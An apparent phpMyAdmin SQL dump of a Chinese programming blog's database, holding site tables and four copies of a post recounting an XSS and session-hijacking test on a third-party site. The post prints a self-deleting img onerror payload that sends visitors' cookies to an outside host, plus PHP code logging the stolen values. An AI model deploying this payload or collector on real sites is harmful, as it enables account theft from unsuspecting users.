-- phpMyAdmin SQL Dump
-- version 4.5.1
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: 2016-10-15 15:20:26
-- 服务器版本： 10.1.10-MariaDB
-- PHP Version: 7.0.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `mongci`
--

-- --------------------------------------------------------

--
-- 表的结构 `atd_articles`
--

CREATE TABLE `atd_articles` (
  `aid` bigint(20) NOT NULL COMMENT 'ID',
  `topic` bigint(20) NOT NULL DEFAULT '0' COMMENT '话题',
  `category` bigint(20) NOT NULL,
  `title` tinytext NOT NULL,
  `remark` tinytext NOT NULL COMMENT '摘要',
  `contents` text NOT NULL,
  `author` bigint(20) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0',
  `created` int(11) NOT NULL,
  `modified` int(11) NOT NULL,
  `keep_top` tinyint(1) NOT NULL DEFAULT '0' COMMENT '置顶',
  `replys` int(11) NOT NULL DEFAULT '0' COMMENT '回复数',
  `public` tinyint(1) NOT NULL DEFAULT '1',
  `allow_reply` tinyint(1) NOT NULL DEFAULT '1',
  `verify` tinyint(1) NOT NULL DEFAULT '0' COMMENT '验证',
  `hash` varchar(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_articles`
--

INSERT INTO `atd_articles` (`aid`, `topic`, `category`, `title`, `remark`, `contents`, `author`, `views`, `created`, `modified`, `keep_top`, `replys`, `public`, `allow_reply`, `verify`, `hash`) VALUES
(27, 0, 1, '一次不完整的XSS混合渗透测试记录', '第一次实地操作web渗透，啊哈哈，结果还是喜人的...', '# 一次不完整的XSS混合渗透测试记录\r\n第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：\r\n![Cookie 登陆](/$50/login_by_cookie.png)\r\n常规信息已经打码，本次web渗透的成功原因有两个\r\n## 1. XSS注入漏洞若干  \r\n为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS\r\n当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续\r\n和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫\r\nXSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，\r\n先贴测试脚本\r\n```html\r\n<img src="" \r\nonerror="var s=document.createElement(''script'');\r\ns.setAttribute(''src'',''//safe.atd3.cn/a?b=''+document.domain+''&c=''+document.cookie);\r\nvar b=document.all[0];\r\nb.appendChild(s);\r\nb.removeChild(s);\r\nthis.parentNode.removeChild(this);">\r\n```\r\n这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url\r\n然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名\r\n反正这是我的一个简易后台代码,PHP做服务器端的\r\n![百度的图片](/$62/baidu_jgylogo3.gif)\r\n```php\r\n<?php\r\n$file_name=''cookie.php'';\r\nif (!file_exists($file_name))\r\n	file_put_contents($file_name,"<?php \\$a=[];\\n");\r\nif (isset($_SERVER[''QUERY_STRING'']))\r\n{\r\n	file_put_contents($file_name,''$a[]=\\''''.$_SERVER[''QUERY_STRING'']."'';\\n",FILE_APPEND);\r\n}\r\n```\r\n好了，前期准备做好了，接下来开始注入测试，，，进入网站，，\r\n直接插入一个简单的代码\r\n```html\r\n<img src="" onerror="console.log(''xss'');">\r\n```\r\n这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图\r\n![用Markdown编辑](/$51/edit_with_markdown.png)\r\n咳咳，，嗯，我顺带回答了问题，看看注入后的效果\r\n![注入脚本查看](/$52/nothing.png)\r\n啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里\r\n![唯一的痕迹](/$53/my_script.png)\r\n然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子\r\n![倒霉的小伙子](/$54/cookies.png)\r\n侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，\r\n接下来是第二个成功原因`session fixation`漏洞\r\n## 2. session fixation 攻击\r\n第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，\r\n毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图\r\n![XSS防范](/$55/xss_def.png)\r\n看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本\r\n`document.cookie`获取的cookie就不完整了，，，如图，，\r\n![脚本获取的cookie](/$56/cookie_with_js.png)\r\n可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。\r\n还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎\r\ncookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，\r\n![修改cookie](/$57/one_cookie.png)\r\n通过抓包软件，抓到的数据包可以证明：\r\n![一个cookie的GET](/$58/one_cookie_get.png)\r\n然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了\r\n![返回设置cookie](/$59/set_cookie.png)\r\n就问傻不傻~！session fixation攻击，，？应该就是叫这个来着\r\n咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，\r\n![返回的页面](/$60/a_girl.png)\r\n哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。\r\n这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，\r\n已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。\r\n啊哈哈，好了，总结，，\r\n## 3. 总结\r\n在此次渗透过程中我使用了三种方式\r\n1. XSS 注入\r\n2. session fixation 探测\r\n3. iframe 劫持  \r\n	这个东西麽。网站对其有防范。。。就不截图了\r\n\r\n在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie\r\n直接变成了未登陆状态，咳，还意外发现了这个：\r\n![百度的招聘](/$61/chance_for_you.png)\r\n所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了\r\n[测试代码](/$63/safe.zip)\r\n\r\n>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为', 43, 0, 1466659999, 1466659999, 0, 0, 1, 1, 0, ''),
(30, 0, 0, '一次不完整的XSS混合渗透测试记录', '第一次实地操作web渗透，啊哈哈，结果还是喜人的...', '# 一次不完整的XSS混合渗透测试记录\r\n第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：\r\n![Cookie 登陆](/$50/login_by_cookie.png)\r\n常规信息已经打码，本次web渗透的成功原因有两个\r\n## 1. XSS注入漏洞若干  \r\n为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS\r\n当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续\r\n和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫\r\nXSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，\r\n先贴测试脚本\r\n```html\r\n<img src="" \r\nonerror="var s=document.createElement(''script'');\r\ns.setAttribute(''src'',''//safe.atd3.cn/a?b=''+document.domain+''&c=''+document.cookie);\r\nvar b=document.all[0];\r\nb.appendChild(s);\r\nb.removeChild(s);\r\nthis.parentNode.removeChild(this);">\r\n```\r\n这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url\r\n然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名\r\n反正这是我的一个简易后台代码,PHP做服务器端的\r\n![百度的图片](/$62/baidu_jgylogo3.gif)\r\n```php\r\n<?php\r\n$file_name=''cookie.php'';\r\nif (!file_exists($file_name))\r\n	file_put_contents($file_name,"<?php \\$a=[];\\n");\r\nif (isset($_SERVER[''QUERY_STRING'']))\r\n{\r\n	file_put_contents($file_name,''$a[]=\\''''.$_SERVER[''QUERY_STRING'']."'';\\n",FILE_APPEND);\r\n}\r\n```\r\n好了，前期准备做好了，接下来开始注入测试，，，进入网站，，\r\n直接插入一个简单的代码\r\n```html\r\n<img src="" onerror="console.log(''xss'');">\r\n```\r\n这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图\r\n![用Markdown编辑](/$51/edit_with_markdown.png)\r\n咳咳，，嗯，我顺带回答了问题，看看注入后的效果\r\n![注入脚本查看](/$52/nothing.png)\r\n啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里\r\n![唯一的痕迹](/$53/my_script.png)\r\n然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子\r\n![倒霉的小伙子](/$54/cookies.png)\r\n侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，\r\n接下来是第二个成功原因`session fixation`漏洞\r\n## 2. session fixation 攻击\r\n第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，\r\n毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图\r\n![XSS防范](/$55/xss_def.png)\r\n看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本\r\n`document.cookie`获取的cookie就不完整了，，，如图，，\r\n![脚本获取的cookie](/$56/cookie_with_js.png)\r\n可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。\r\n还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎\r\ncookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，\r\n![修改cookie](/$57/one_cookie.png)\r\n通过抓包软件，抓到的数据包可以证明：\r\n![一个cookie的GET](/$58/one_cookie_get.png)\r\n然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了\r\n![返回设置cookie](/$59/set_cookie.png)\r\n就问傻不傻~！session fixation攻击，，？应该就是叫这个来着\r\n咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，\r\n![返回的页面](/$60/a_girl.png)\r\n哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。\r\n这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，\r\n已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。\r\n啊哈哈，好了，总结，，\r\n## 3. 总结\r\n在此次渗透过程中我使用了三种方式\r\n1. XSS 注入\r\n2. session fixation 探测\r\n3. iframe 劫持  \r\n	这个东西麽。网站对其有防范。。。就不截图了\r\n\r\n在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie\r\n直接变成了未登陆状态，咳，还意外发现了这个：\r\n![百度的招聘](/$61/chance_for_you.png)\r\n所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了\r\n[测试代码](/$63/safe.zip)\r\n\r\n>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为', 43, 0, 1466659999, 1466659999, 0, 0, 1, 1, 0, '411b91ee9d41e51a9c8df7cdb50b4a0a'),
(48, 0, 0, '一次不完整的XSS混合渗透测试记录', '第一次实地操作web渗透，啊哈哈，结果还是喜人的...', '# 一次不完整的XSS混合渗透测试记录\r\n第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：\r\n![Cookie 登陆](/$50/login_by_cookie.png)\r\n常规信息已经打码，本次web渗透的成功原因有两个\r\n## 1. XSS注入漏洞若干  \r\n为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS\r\n当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续\r\n和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫\r\nXSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，\r\n先贴测试脚本\r\n```html\r\n<img src="" \r\nonerror="var s=document.createElement(''script'');\r\ns.setAttribute(''src'',''//safe.atd3.cn/a?b=''+document.domain+''&c=''+document.cookie);\r\nvar b=document.all[0];\r\nb.appendChild(s);\r\nb.removeChild(s);\r\nthis.parentNode.removeChild(this);">\r\n```\r\n这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url\r\n然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名\r\n反正这是我的一个简易后台代码,PHP做服务器端的\r\n![百度的图片](/$62/baidu_jgylogo3.gif)\r\n```php\r\n<?php\r\n$file_name=''cookie.php'';\r\nif (!file_exists($file_name))\r\n	file_put_contents($file_name,"<?php \\$a=[];\\n");\r\nif (isset($_SERVER[''QUERY_STRING'']))\r\n{\r\n	file_put_contents($file_name,''$a[]=\\''''.$_SERVER[''QUERY_STRING'']."'';\\n",FILE_APPEND);\r\n}\r\n```\r\n好了，前期准备做好了，接下来开始注入测试，，，进入网站，，\r\n直接插入一个简单的代码\r\n```html\r\n<img src="" onerror="console.log(''xss'');">\r\n```\r\n这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图\r\n![用Markdown编辑](/$51/edit_with_markdown.png)\r\n咳咳，，嗯，我顺带回答了问题，看看注入后的效果\r\n![注入脚本查看](/$52/nothing.png)\r\n啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里\r\n![唯一的痕迹](/$53/my_script.png)\r\n然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子\r\n![倒霉的小伙子](/$54/cookies.png)\r\n侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，\r\n接下来是第二个成功原因`session fixation`漏洞\r\n## 2. session fixation 攻击\r\n第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，\r\n毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图\r\n![XSS防范](/$55/xss_def.png)\r\n看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本\r\n`document.cookie`获取的cookie就不完整了，，，如图，，\r\n![脚本获取的cookie](/$56/cookie_with_js.png)\r\n可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。\r\n还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎\r\ncookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，\r\n![修改cookie](/$57/one_cookie.png)\r\n通过抓包软件，抓到的数据包可以证明：\r\n![一个cookie的GET](/$58/one_cookie_get.png)\r\n然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了\r\n![返回设置cookie](/$59/set_cookie.png)\r\n就问傻不傻~！session fixation攻击，，？应该就是叫这个来着\r\n咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，\r\n![返回的页面](/$60/a_girl.png)\r\n哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。\r\n这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，\r\n已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。\r\n啊哈哈，好了，总结，，\r\n## 3. 总结\r\n在此次渗透过程中我使用了三种方式\r\n1. XSS 注入\r\n2. session fixation 探测\r\n3. iframe 劫持  \r\n	这个东西麽。网站对其有防范。。。就不截图了\r\n\r\n在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie\r\n直接变成了未登陆状态，咳，还意外发现了这个：\r\n![百度的招聘](/$61/chance_for_you.png)\r\n所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了\r\n[测试代码](/$63/safe.zip)\r\n>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为', 48, 0, 1476104456, 1476104456, 0, 0, 1, 1, 0, '152a3363a44625c25156ad7cb786b2a7'),
(49, 0, 0, '一次不完整的XSS混合渗透测试记录', '第一次实地操作web渗透，啊哈哈，结果还是喜人的...', '# 一次不完整的XSS混合渗透测试记录\r\n第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：\r\n![Cookie 登陆](/$50/login_by_cookie.png)\r\n常规信息已经打码，本次web渗透的成功原因有两个\r\n## 1. XSS注入漏洞若干  \r\n为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS\r\n当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续\r\n和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫\r\nXSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，\r\n先贴测试脚本\r\n```html\r\n<img src="" \r\nonerror="var s=document.createElement(''script'');\r\ns.setAttribute(''src'',''//safe.atd3.cn/a?b=''+document.domain+''&c=''+document.cookie);\r\nvar b=document.all[0];\r\nb.appendChild(s);\r\nb.removeChild(s);\r\nthis.parentNode.removeChild(this);">\r\n```\r\n这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url\r\n然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名\r\n反正这是我的一个简易后台代码,PHP做服务器端的\r\n```php\r\n<?php\r\n$file_name=''cookie.php'';\r\nif (!file_exists($file_name))\r\n	file_put_contents($file_name,"<?php \\$a=[];\\n");\r\nif (isset($_SERVER[''QUERY_STRING'']))\r\n{\r\n	file_put_contents($file_name,''$a[]=\\''''.$_SERVER[''QUERY_STRING'']."'';\\n",FILE_APPEND);\r\n}\r\n```\r\n好了，前期准备做好了，接下来开始注入测试，，，进入网站，，\r\n直接插入一个简单的代码\r\n```html\r\n<img src="" onerror="console.log(''xss'');">\r\n```\r\n这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图\r\n![用Markdown编辑](/$51/edit_with_markdown.png)\r\n咳咳，，嗯，我顺带回答了问题，看看注入后的效果\r\n![注入脚本查看](/$52/nothing.png)\r\n啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里\r\n![唯一的痕迹](/$53/my_script.png)\r\n然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子\r\n![倒霉的小伙子](/$54/cookies.png)\r\n侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，\r\n接下来是第二个成功原因`session fixation`漏洞\r\n## 2. session fixation 攻击\r\n第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，\r\n毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图\r\n![XSS防范](/$55/xss_def.png)\r\n看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本\r\n`document.cookie`获取的cookie就不完整了，，，如图，，\r\n![脚本获取的cookie](/$56/cookie_with_js.png)\r\n可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。\r\n还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎\r\ncookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，\r\n![修改cookie](/$57/one_cookie.png)\r\n通过抓包软件，抓到的数据包可以证明：\r\n![一个cookie的GET](/$58/one_cookie_get.png)\r\n然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了\r\n![返回设置cookie](/$59/set_cookie.png)\r\n就问傻不傻~！session fixation攻击，，？应该就是叫这个来着\r\n咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，\r\n![返回的页面](/$60/a_girl.png)\r\n哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。\r\n这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，\r\n已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。\r\n啊哈哈，好了，总结，，\r\n## 3. 总结\r\n在此次渗透过程中我使用了三种方式\r\n1. XSS 注入\r\n2. session fixation 探测\r\n3. iframe 劫持  \r\n	这个东西麽。网站对其有防范。。。就不截图了\r\n\r\n在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie\r\n直接变成了未登陆状态，咳，还意外发现了这个：\r\n![百度的招聘](/$61/chance_for_you.png)\r\n所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了\r\n[测试代码](/$63/safe.zip)\r\n>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为', 48, 0, 1476104456, 1476104456, 0, 0, 1, 1, 0, 'c127aabf5cc9a3aeab501783b3de32c3');

-- --------------------------------------------------------

--
-- 表的结构 `atd_article_tag`
--

CREATE TABLE `atd_article_tag` (
  `tid` bigint(20) NOT NULL,
  `aid` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_article_tag`
--

INSERT INTO `atd_article_tag` (`tid`, `aid`) VALUES
(2, -23000),
(3, -23000),
(4, -23000),
(2, 27),
(3, 27),
(4, 27),
(2, 30),
(3, 30),
(4, 30),
(2, 48),
(3, 48),
(4, 48),
(2, 49),
(3, 49),
(4, 49);

-- --------------------------------------------------------

--
-- 表的结构 `atd_bugs`
--

CREATE TABLE `atd_bugs` (
  `id` int(11) NOT NULL,
  `user` varchar(80) NOT NULL,
  `discription` varchar(255) NOT NULL,
  `time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_bugs`
--

INSERT INTO `atd_bugs` (`id`, `user`, `discription`, `time`, `status`) VALUES
(1, 'SixerMe', '用户名可使用空格', '2016-10-05 13:18:36', 1),
(2, '_KaQqi', '特殊字符 UNICODE控制字符->RLO 导致出错', '2016-10-05 13:54:20', 0);

-- --------------------------------------------------------

--
-- 表的结构 `atd_category`
--

CREATE TABLE `atd_category` (
  `cid` bigint(20) NOT NULL COMMENT '分类',
  `icon` bigint(20) NOT NULL COMMENT '分类图标',
  `name` varchar(80) NOT NULL DEFAULT '无分类',
  `discription` tinytext NOT NULL,
  `counts` int(11) NOT NULL DEFAULT '0',
  `parent` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_category`
--

INSERT INTO `atd_category` (`cid`, `icon`, `name`, `discription`, `counts`, `parent`) VALUES
(1, 0, '无分类', '默认分类', 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `atd_groups`
--

CREATE TABLE `atd_groups` (
  `gid` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  `gname` varchar(80) NOT NULL,
  `edit_web` enum('Y','N') NOT NULL DEFAULT 'N',
  `edit_group` enum('Y','N') NOT NULL DEFAULT 'N',
  `edit_user` enum('Y','N') NOT NULL DEFAULT 'N'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='权限表';

--
-- 转存表中的数据 `atd_groups`
--

INSERT INTO `atd_groups` (`gid`, `priority`, `gname`, `edit_web`, `edit_group`, `edit_user`) VALUES
(1, 0, 'owner', 'Y', 'Y', 'Y'),
(2, 1, 'user', 'N', 'N', 'N');

-- --------------------------------------------------------

--
-- 表的结构 `atd_nav`
--

CREATE TABLE `atd_nav` (
  `id` int(11) NOT NULL,
  `name` varchar(24) NOT NULL,
  `url` tinytext NOT NULL,
  `title` varchar(255) NOT NULL,
  `show` tinyint(1) NOT NULL DEFAULT '1',
  `sort` int(11) NOT NULL DEFAULT '0',
  `parent` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_nav`
--

INSERT INTO `atd_nav` (`id`, `name`, `url`, `title`, `show`, `sort`, `parent`) VALUES
(1, 'index', '/', '', 1, 1, 0),
(2, 'notes', '/notes', '', 1, 6, 0),
(3, 'article', '/article', '', 1, 2, 0),
(4, 'books', '/books', '', 1, 3, 0),
(5, 'question', '/question', '', 1, 4, 0),
(7, 'test', '/test', 'OnlineJudge', 1, 5, 0),
(9, 'about', '/about', '', 1, 7, 0);

-- --------------------------------------------------------

--
-- 表的结构 `atd_signin_historys`
--

CREATE TABLE `atd_signin_historys` (
  `hid` bigint(20) NOT NULL,
  `uid` bigint(20) NOT NULL,
  `ip` varchar(64) NOT NULL,
  `time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_signin_historys`
--

INSERT INTO `atd_signin_historys` (`hid`, `uid`, `ip`, `time`) VALUES
(1, 43, '127.0.0.1', 1475722631),
(2, 45, '127.0.0.1', 1475722691),
(3, 46, '127.0.0.1', 1475722991),
(4, 47, '127.0.0.1', 1475723206),
(5, 43, '127.0.0.1', 1475725148),
(6, 43, '127.0.0.1', 1475725860),
(7, 43, '127.0.0.1', 1475725895),
(8, 43, '127.0.0.1', 1475728023),
(9, 43, '127.0.0.1', 1475883143),
(10, 43, '127.0.0.1', 1475883549),
(11, 43, '127.0.0.1', 1475883581),
(12, 43, '127.0.0.1', 1475883661),
(13, 43, '127.0.0.1', 1475883693),
(14, 43, '127.0.0.1', 1475975525),
(15, 43, '127.0.0.1', 1476087704),
(16, 43, '127.0.0.1', 1476087817),
(17, 43, '127.0.0.1', 1476088217),
(18, 43, '127.0.0.1', 1476089722),
(19, 43, '127.0.0.1', 1476089954),
(20, 43, '127.0.0.1', 1476091087),
(21, 43, '127.0.0.1', 1476091155),
(22, 43, '127.0.0.1', 1476091230),
(23, 43, '127.0.0.1', 1476091376),
(24, 43, '127.0.0.1', 1476091514),
(25, 43, '127.0.0.1', 1476091674),
(26, 43, '127.0.0.1', 1476092362),
(27, 43, '127.0.0.1', 1476092732),
(28, 43, '127.0.0.1', 1476092889),
(29, 43, '127.0.0.1', 1476093018),
(30, 43, '127.0.0.1', 1476093451),
(31, 43, '127.0.0.1', 1476093831),
(32, 43, '127.0.0.1', 1476094097),
(33, 43, '127.0.0.1', 1476098220),
(34, 48, '127.0.0.1', 1476104456),
(35, 43, '127.0.0.1', 1476112038),
(36, 43, '127.0.0.1', 1476112144),
(37, 48, '127.0.0.1', 1476183479),
(38, 48, '127.0.0.1', 1476201705),
(39, 43, '127.0.0.1', 1476201732),
(40, 48, '127.0.0.1', 1476264619),
(41, 48, '127.0.0.1', 1476266250),
(42, 48, '127.0.0.1', 1476342253),
(43, 48, '127.0.0.1', 1476342286),
(44, 48, '127.0.0.1', 1476342325),
(45, 48, '127.0.0.1', 1476342384),
(46, 48, '127.0.0.1', 1476342426),
(47, 48, '127.0.0.1', 1476342487),
(48, 48, '127.0.0.1', 1476342512),
(49, 48, '127.0.0.1', 1476342582),
(50, 48, '127.0.0.1', 1476342656),
(51, 48, '127.0.0.1', 1476342695),
(52, 48, '127.0.0.1', 1476342715),
(53, 48, '127.0.0.1', 1476342734),
(54, 48, '127.0.0.1', 1476342760),
(55, 48, '127.0.0.1', 1476342771),
(56, 48, '127.0.0.1', 1476343515),
(57, 48, '127.0.0.1', 1476343793),
(58, 47, '127.0.0.1', 1476354661);

-- --------------------------------------------------------

--
-- 表的结构 `atd_site_options`
--

CREATE TABLE `atd_site_options` (
  `id` int(11) NOT NULL,
  `name` varchar(64) NOT NULL,
  `value` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='网站设置表';

--
-- 转存表中的数据 `atd_site_options`
--

INSERT INTO `atd_site_options` (`id`, `name`, `value`) VALUES
(1, 'site_name', '芒刺中国'),
(2, 'theme', 'default'),
(19, 'site_logo', '/static/img/mccn.svg'),
(20, 'keywords', '芒刺,程序员,文摘'),
(21, 'lang', 'zh_cn'),
(22, 'HV_SignUp', '0'),
(23, 'HV_SignIn', '0'),
(24, 'HV_Post', '0'),
(25, 'HV_Comment', '0'),
(26, 'allowSignUp', '1'),
(27, 'copyright', '芒刺中国'),
(28, 'site_close', '0'),
(29, 'close_info', '芒刺中国系统开发中'),
(30, 'default_avatar', '39');

-- --------------------------------------------------------

--
-- 表的结构 `atd_tags`
--

CREATE TABLE `atd_tags` (
  `tid` int(11) NOT NULL,
  `topic` int(11) NOT NULL,
